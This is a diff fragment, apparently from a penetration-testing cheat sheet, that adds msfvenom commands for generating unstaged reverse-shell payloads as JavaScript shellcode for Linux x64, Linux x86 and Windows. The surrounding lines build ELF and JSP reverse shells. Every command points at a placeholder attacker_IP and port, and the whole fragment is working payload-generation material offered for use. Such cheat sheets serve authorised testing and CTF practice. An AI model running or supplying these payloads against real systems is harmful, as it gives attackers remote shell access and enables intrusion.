@@ -2085,6 +2085,11 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f elf
 
 # create TCP reverse shell jsp (unstaged)
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f raw -o shell.jsp
+
+# create TCP reverse shell as js shellcode (unstaged)
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f js_le -e generic/none # Linux x64
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f js_le -e generic/none # Linux x86
+msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f js_le -e generic/none # Windows
 ```
 
 
